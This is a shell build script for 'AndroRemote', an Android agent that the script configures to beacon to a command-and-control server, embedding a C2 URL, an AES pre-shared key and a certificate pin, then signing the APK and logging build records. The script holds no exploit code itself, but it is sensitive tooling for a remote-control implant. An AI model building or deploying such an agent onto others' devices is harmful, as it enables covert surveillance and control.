#!/bin/sh
# Build AndroRemote APK. Optional arg: C2 base URL (PSK + cert pin auto-read
# from ~/.androremote/, or override with C2_KEY / C2_PIN env vars).
#   ./build.sh                                        # adb-direct agent only
#   ./build.sh https://c2.example.com                 # agent beacons to C2 (encrypted)
#   C2_PIN=<sha256-of-cert-der> ./build.sh <url>      # pin the --tls self-signed cert
# First run downloads OkHttp 3.14.9 + Okio 1.17.2 from Maven Central into libs/.
set -e
SDK="${SDK:-$HOME/Library/Android/sdk}"
BT="$SDK/build-tools/35.0.0"
J="$SDK/platforms/android-35/android.jar"
J8="${J8:-/Library/Java/JavaVirtualMachines/temurin-8.jdk/Contents/Home}"
ROOT="$(cd "$(dirname "$0")" && pwd)"
OUT="$ROOT/build/apk"
RES="$ROOT/app/src/main/res"
LIBS="$ROOT/libs"

# Signing key: bring your own, never shared. Generated on first build when absent.
# Password sources: $KS_PASS, else .pass beside the keystore, else generated.
KS="${KS:-$ROOT/keystore/release.keystore}"
KSPASSFILE="$(dirname "$KS")/.pass"
KSPASS="${KS_PASS:-}"
[ -z "$KSPASS" ] && [ -f "$KSPASSFILE" ] && KSPASS=$(tr -d ' \n' < "$KSPASSFILE")
if [ ! -f "$KS" ]; then
    KSPASS="${KSPASS:-$(openssl rand -hex 16)}"
    mkdir -p "$(dirname "$KS")"
    "$J8/bin/keytool" -genkeypair -keystore "$KS" -alias androremote \
        -keyalg RSA -keysize 2048 -validity 10950 \
        -storepass "$KSPASS" -keypass "$KSPASS" \
        -dname "CN=AndroRemote, OU=Operator, O=Self-signed, C=US"
    printf '%s' "$KSPASS" > "$KSPASSFILE"
    chmod 600 "$KSPASSFILE"
    echo "generated signing key $KS (password written to $KSPASSFILE, gitignored)"
fi
[ -z "$KSPASS" ] && { echo "error: no keystore password — set KS_PASS or create $KSPASSFILE" >&2; exit 1; }

C2URL="${1:-${C2_URL:-}}"
C2KEY="${C2_KEY:-}"
[ -z "$C2KEY" ] && [ -f "$HOME/.androremote/c2.key" ] && C2KEY=$(tr -d ' \n' < "$HOME/.androremote/c2.key")
C2PIN="${C2_PIN:-}"
if [ -z "$C2PIN" ] && [ -f "$HOME/.androremote/c2cert.pem" ]; then
    C2PIN=$(openssl x509 -in "$HOME/.androremote/c2cert.pem" -outform DER | shasum -a 256 | cut -d' ' -f1)
fi
mkdir -p "$RES/values" "$LIBS"
printf '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <string name="c2_url" translatable="false">%s</string>\n    <string name="c2_key" translatable="false">%s</string>\n    <string name="c2_pin" translatable="false">%s</string>\n</resources>\n' \
    "$C2URL" "$C2KEY" "$C2PIN" > "$RES/values/c2.xml"

OKHTTP="$LIBS/okhttp-3.14.9.jar"
OKIO="$LIBS/okio-1.17.2.jar"
[ -f "$OKHTTP" ] || curl -fsSL -o "$OKHTTP" \
    https://repo1.maven.org/maven2/com/squareup/okhttp3/okhttp/3.14.9/okhttp-3.14.9.jar
[ -f "$OKIO" ] || curl -fsSL -o "$OKIO" \
    https://repo1.maven.org/maven2/com/squareup/okio/okio/1.17.2/okio-1.17.2.jar

cd "$ROOT"
rm -rf build/classes "$OUT/unpacked" "$OUT"/z*.apk "$OUT/dexout" "$OUT/gen" \
       "$OUT/androremote.apk" "$OUT/unsigned.apk" "$OUT/res.zip" "$OUT/sources.txt"
mkdir -p build/classes "$OUT/unpacked" "$OUT/dexout" "$OUT/gen"

"$BT/aapt2" compile --dir "$RES" -o "$OUT/res.zip"
"$BT/aapt2" link -I "$J" --manifest "$ROOT/app/src/main/AndroidManifest.xml" \
    --java "$OUT/gen" \
    --min-sdk-version 26 --target-sdk-version 35 --version-code 1 --version-name 1.0 \
    -o "$OUT/unsigned.apk" "$OUT/res.zip"

find "$OUT/gen" -name '*.java' > "$OUT/sources.txt"
find "$ROOT/app/src" -name '*.java' >> "$OUT/sources.txt"
"$J8/bin/javac" -bootclasspath "$J:$J8/jre/lib/rt.jar" \
    -classpath "$OKHTTP:$OKIO" \
    -d build/classes @"$OUT/sources.txt"

"$BT/d8" --release --min-api 26 --lib "$J" --output "$OUT/dexout" \
    "$OKHTTP" "$OKIO" $(find build/classes -name '*.class')

cd "$OUT/unpacked"
unzip -q "$OUT/unsigned.apk"
cp "$OUT/dexout/classes.dex" .
# resources.arsc must be STORED (uncompressed) + 4-byte aligned for API 30+
zip -q -X -0 "$OUT/z1.apk" resources.arsc
zip -q -r -X -9 "$OUT/z1.apk" AndroidManifest.xml classes.dex res
"$BT/zipalign" -f -p 4 "$OUT/z1.apk" "$OUT/z2.apk"
if [ -f "$KSPASSFILE" ]; then
    "$BT/apksigner" sign --ks "$KS" --ks-pass "file:$KSPASSFILE" \
        --out "$OUT/androremote.apk" "$OUT/z2.apk"
else
    "$BT/apksigner" sign --ks "$KS" --ks-pass "pass:$KSPASS" \
        --out "$OUT/androremote.apk" "$OUT/z2.apk"
fi
echo "OK: $OUT/androremote.apk (c2_url=${C2URL:-<none>} enc=${C2KEY:+AES-256-GCM} pin=${C2PIN:+set})"

# ── build history: keep every artifact + record what it was baked with ──────
# Records hold no secrets: the PSK is reduced to a short fingerprint, the
# password never leaves the keystore.
STAMP=$(date -u +%Y%m%dT%H%M%SZ)
SLUG=$(printf '%s' "${C2URL:-direct}" | tr -c 'A-Za-z0-9._-' '-' | cut -c1-40)
KEEP="$OUT/androremote-$STAMP-$SLUG.apk"
cp "$OUT/androremote.apk" "$KEEP"

PSK_FP=""
if [ -n "$C2KEY" ]; then
    # hash the decoded key bytes, matching core.key_fp() / /api/state
    PSK_FP=$(PSK_HEX="$C2KEY" python3 -c "
import binascii, hashlib, os
raw = os.environ.get('PSK_HEX', '')
try:
    data = binascii.unhexlify(raw)
except Exception:
    data = raw.encode()
print(hashlib.sha256(data).hexdigest()[:12] if data else '')
")
fi
SIGNER=$("$J8/bin/keytool" -list -v -keystore "$KS" -storepass "$KSPASS" 2>/dev/null \
    | grep -m1 -i "SHA256:" | sed 's/.*SHA256: *//' | tr -d ':' | tr 'A-Z' 'a-z')
APK_SHA=$(shasum -a 256 "$KEEP" | cut -d' ' -f1)
APK_SIZE=$(wc -c < "$KEEP" | tr -d ' ')

AR_BUILT_AT="$STAMP" AR_FILE="$(basename "$KEEP")" AR_URL="${C2URL:-}" \
AR_ENC="${C2KEY:+1}" AR_PIN="${C2PIN:+1}" AR_PSK_FP="$PSK_FP" AR_SIGNER="$SIGNER" \
AR_SHA="$APK_SHA" AR_SIZE="$APK_SIZE" AR_KS="$(basename "$KS")" AR_JSON="$OUT/builds.json" \
python3 - <<'PY'
import json, os

out = os.environ["AR_JSON"]
try:
    with open(out) as f:
        records = json.load(f)
except (OSError, ValueError):
    records = []

for r in records:
    r["latest"] = False

records.append({
    "file": os.environ["AR_FILE"],
    "latest": True,
    "built_at": os.environ["AR_BUILT_AT"],
    "c2_url": os.environ["AR_URL"],
    "enc": bool(os.environ["AR_ENC"]),
    "pin_set": bool(os.environ["AR_PIN"]),
    "psk_fp": os.environ["AR_PSK_FP"] or None,
    "signer_sha256": os.environ["AR_SIGNER"],
    "sha256": os.environ["AR_SHA"],
    "size": int(os.environ["AR_SIZE"]),
    "keystore": os.environ["AR_KS"],
})
records = records[-50:]

tmp = out + ".tmp"
with open(tmp, "w") as f:
    json.dump(records, f, indent=1)
os.replace(tmp, out)
PY

echo "recorded: $KEEP ($(printf '%s' "$APK_SHA" | cut -c1-12), ${APK_SIZE} B)"
